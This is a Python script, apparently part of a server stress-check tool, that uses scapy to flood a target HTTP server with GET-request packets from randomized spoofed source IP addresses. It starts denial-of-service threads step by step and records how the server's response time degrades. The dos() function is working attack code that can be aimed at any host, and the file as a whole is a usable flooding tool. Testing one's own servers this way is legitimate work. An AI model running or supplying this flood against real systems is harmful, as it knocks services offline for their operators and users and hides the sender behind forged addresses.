import random
from matplotlib.ticker import MultipleLocator
from scapy.all import *
from scapy.layers.inet import *
import time
import http.client
import threading
import matplotlib.pyplot as plt

global threads_run
# global packet_list


def dos(server_ip, server_port):
    try:
        # Craft an HTTP GET request packet
        tcp_packet = TCP(dport=server_port, sport=12345)
        get_request = (
            "GET / HTTP/1.1\r\n"
            "Host: {}\r\n"
            "\r\n"
        ).format(server_ip)

        # global packet_list
        # idx = len(packet_list)
        # packets = 0
        # packet_list.append(packets)
        global threads_run
        while threads_run:
            rand_num1 = random.randint(1, 254)
            rand_num2 = random.randint(1, 254)
            rand_num3 = random.randint(1, 254)
            rand_num4 = random.randint(1, 254)
            src_ip = f'{str(rand_num1)}.{str(rand_num2)}.{str(rand_num3)}.{str(rand_num4)}'
            ip_packet = IP(src=src_ip, dst=server_ip)

            _packet = ip_packet / tcp_packet / get_request

            # Send the packet
            send(_packet, verbose=0)

            # count packets
            # packet_list[idx] += 1
    except:
        pass


def get_response_time(server_ip, server_port, path="/"):
    try:
        start_time = time.time()

        # Create an HTTP connection
        conn = http.client.HTTPConnection(server_ip, server_port)

        # Send a GET request
        conn.request("GET", path)

        # Get the response
        response = conn.getresponse()  # used to measure response time of server

        # Measure the response time
        response_time = (time.time() - start_time) * 1000  # in milliseconds

        # Close the connection
        conn.close()

        return response_time

    except Exception as e:
        # print(f"An error occurred: {e}")
        return None


def execute(server_ip, server_port, num_of_threads=10, response_avgs_between_threads=10, samples_for_avg=10, output = None):
    global threads_run
    threads_run = True

    # global packet_list
    # packet_list = []
    # packets = 0
    # packet_list.append(packets)

    # server_port must be int
    server_port = int(server_port)

    # sample iterations
    _iter = 1

    # total number of samples averages
    num_of_samples = (1+num_of_threads) * response_avgs_between_threads

    # iterations to calculate avg of responses
    avg_iter = 0

    # sum of responses to calculate average
    res_sum = 0

    # response time average
    res_avg = 0

    # list of dos threads
    dos_threads = []

    # list of iterations for the graph
    iter_list = []

    # list of response times for the graph
    response_times_list = []

    # num of packets
    # packets_sum = 0

    # time list
    # time_list = [time.time(), time.time()]

    # initialize dos threads
    for i in range(num_of_threads):
        dos_threads.append(threading.Thread(target=dos, args=(server_ip, server_port), daemon=True))

    while _iter < (num_of_samples + 1):
        try:
            # calculate response times averages
            while avg_iter <= samples_for_avg:
                response_time = get_response_time(server_ip, server_port)
                # packet_list[0] += 1
                if response_time is None:
                    pass
                else:
                    res_sum += response_time
                    avg_iter += 1
                    time.sleep(1/samples_for_avg)
            res_avg = res_sum / avg_iter
            # reset average variables after calculating the average
            avg_iter = 0
            res_sum = 0
            # append the iteration to the list
            iter_list.append(_iter - 1)
            # append the response time average to the list
            response_times_list.append(res_avg)

            # starting dos thread at the required time
            if num_of_samples > _iter >= response_avgs_between_threads and _iter % response_avgs_between_threads == 0:
                thread_num = _iter // response_avgs_between_threads
                # time_list[1] = time.time()
                # time_interval = time_list[1] - time_list[0]
                # for idx, packet_count in enumerate(packet_list):
                #     packets_sum += packet_count
                #     packet_list[idx] = 0
                # time_list[0] = time.time()
                # print(packets_sum)
                # print(time_interval)
                # output.emit(f"the number of packets per second between {thread_num-1} threads to {thread_num} threads is {int(packets_sum//time_interval)}")
                # packets_sum = 0
                dos_threads[thread_num - 1].start()
                if output:
                    output.emit(f"DoS thread number {thread_num} is running")
                for i in range(0, thread_num-1):
                    if not dos_threads[i].is_alive():
                        raise Exception
            _iter += 1

        except:
            output.emit("The Check stopped due to an Error")
            return None

    # stop all threads
    threads_run = False

    return iter_list, response_times_list, num_of_threads, num_of_samples, response_avgs_between_threads